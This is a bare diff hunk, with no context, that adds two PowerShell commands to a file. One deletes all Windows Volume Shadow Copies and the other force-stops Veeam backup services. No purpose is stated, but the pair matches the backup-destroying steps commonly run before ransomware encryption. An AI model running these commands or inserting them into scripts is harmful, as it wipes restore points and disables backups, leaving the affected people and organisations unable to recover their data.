@@ -1,0 +1,3 @@
+Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_.Delete() }
+Stop-Service -Name veeam* -Force
+
